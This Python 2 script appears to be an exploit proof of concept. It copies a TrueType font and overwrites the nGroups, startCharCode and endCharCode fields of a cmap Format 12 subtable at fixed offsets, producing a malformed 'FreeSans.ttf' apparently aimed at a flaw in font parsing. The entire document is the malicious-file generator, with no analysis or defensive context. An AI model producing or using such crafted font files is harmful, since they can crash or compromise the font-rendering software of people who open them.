import sys
import struct
def main():
    
    try:
                 
        fdR = open('src.ttf', 'rb+')
        strTotal = fdR.read()
        str1 = strTotal[:18316]
        nGroups = '\x00\x00\x00\xDC'          # nGroups field from Format 12 subtable  of cmap table
        startCharCode = '\x00\xE5\xF7\x20'    # startCharCode  field from a Group Structure
        endCharCode  = '\x00\xE5\xF7\xFE'     # endCharCode  field from a Group Structure
        str2 = strTotal[18328:]
         
        fdW= open('FreeSans.ttf', 'wb+')
        fdW.write(str1)
        fdW.write(nGroups)
        fdW.write(startCharCode)
        fdW.write(endCharCode)
        fdW.write(str2)
        fdW.close()
        fdR.close()
        print '[-] Font file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                 
if __name__ == '__main__':
    main()